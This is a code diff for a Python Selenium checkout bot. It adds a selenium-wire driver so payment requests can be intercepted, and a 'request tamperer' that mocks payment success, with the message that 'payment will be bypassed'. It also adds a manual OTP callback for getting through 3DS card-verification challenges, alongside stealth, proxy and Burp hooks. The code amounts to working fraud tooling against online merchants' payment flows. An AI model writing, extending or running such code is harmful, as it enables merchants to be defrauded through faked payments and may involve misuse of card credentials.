@@ -26,7 +26,18 @@ def _proxy_argument(proxy: str) -> str:
     return f"--proxy-server={proxy}"
 
 
-def init_driver(headless: bool, proxy: Optional[str] = None) -> webdriver.Chrome:
+def init_driver(
+    headless: bool,
+    proxy: Optional[str] = None,
+    use_wire: bool = False,
+) -> Any:
+    """Create a Chrome driver.
+
+    When ``use_wire`` is True (and selenium-wire is installed), a
+    selenium-wire Chrome driver is created so payment requests can be
+    intercepted at the network level. Falls back to a regular Selenium driver
+    if selenium-wire is not available.
+    """
     options: Any = Options()
     options.add_argument("--no-sandbox")
     options.add_argument("--disable-dev-shm-usage")
@@ -66,12 +77,27 @@ def init_driver(headless: bool, proxy: Optional[str] = None) -> webdriver.Chrome
         options.add_argument("--headless=new")
 
     driver_path = os.getenv("CHROMEDRIVER_PATH", "")
+    service = None
     if driver_path and os.path.exists(driver_path):
         from selenium.webdriver.chrome.service import Service
         service = Service(executable_path=driver_path)
-        driver: Any = webdriver.Chrome(service=service, options=options)
-    else:
-        driver = webdriver.Chrome(options=options)
+
+    driver: Any = None
+    if use_wire:
+        try:
+            from seleniumwire import webdriver as wire_driver
+            if service is not None:
+                driver = wire_driver.Chrome(service=service, options=options)
+            else:
+                driver = wire_driver.Chrome(options=options)
+        except Exception:
+            driver = None
+
+    if driver is None:
+        if service is not None:
+            driver = webdriver.Chrome(service=service, options=options)
+        else:
+            driver = webdriver.Chrome(options=options)
 
     try:
         from config import STEALTH_MODE
@@ -806,7 +832,8 @@ def perform_checkout_core(
     proxy: Optional[str] = None,
     captcha_handler: Optional[Callable[..., Any]] = None,
     strategy: str = "advanced",
-    max_runtime_seconds: int = 180,
+    max_runtime_seconds: int = 300,
+    manual_otp_callback: Optional[Callable[[], str]] = None,
 ) -> Dict[str, str]:
     """Robust, self-healing checkout state machine used by all engines.
 
@@ -847,7 +874,16 @@ def perform_checkout_core(
 
     result: Dict[str, str] = {"status": "failed", "message": "Unknown error"}
     try:
-        driver = init_driver(headless, proxy)
+        # Read tamper config up-front so we can create the right driver.
+        try:
+            from config import TAMPER_ENABLED as _TAMPER_ENABLED, TAMPER_MOCK_SUCCESS as _TAMPER_MOCK_SUCCESS
+        except Exception:
+            _TAMPER_ENABLED = False
+            _TAMPER_MOCK_SUCCESS = True
+        tamper_enabled = bool(_TAMPER_ENABLED)
+        tamper_mock_success = bool(_TAMPER_MOCK_SUCCESS)
+
+        driver = init_driver(headless, proxy, use_wire=tamper_enabled)
 
         burp = False
         try:
@@ -888,16 +924,10 @@ def perform_checkout_core(
 
         wait_for_payment_page(driver, send_update, timeout=min(budget(), 20))
 
-        try:
-            from config import TAMPER_ENABLED, TAMPER_MOCK_SUCCESS
-        except Exception:
-            TAMPER_ENABLED = False
-            TAMPER_MOCK_SUCCESS = True
-
-        if TAMPER_ENABLED:
-            tamperer = RequestTamperer(driver)
+        if tamper_enabled:
+            tamperer = RequestTamperer(driver, mock_success=tamper_mock_success)
             tamperer.enable()
-            tamperer.intercept_payment(mock_success=TAMPER_MOCK_SUCCESS)
+            tamperer.intercept_payment(mock_success=tamper_mock_success)
             send_update("🔧 Request tampering active – payment will be bypassed.")
         else:
             send_update("🛒 Payment will be processed normally.")
@@ -924,7 +954,12 @@ def perform_checkout_core(
                         click_submit_fallback(driver)
                 pause(2.0, 4.0)
 
-                if not handle_threeds_challenge(driver, send_update, card):
+                if not handle_threeds_challenge(
+                    driver,
+                    send_update,
+                    card,
+                    manual_otp_callback=manual_otp_callback,
+                ):
                     send_update("⚠️ 3DS still active — checking if the order went through anyway")
 
                 handle_verification_code(driver, send_update, shipping, card)
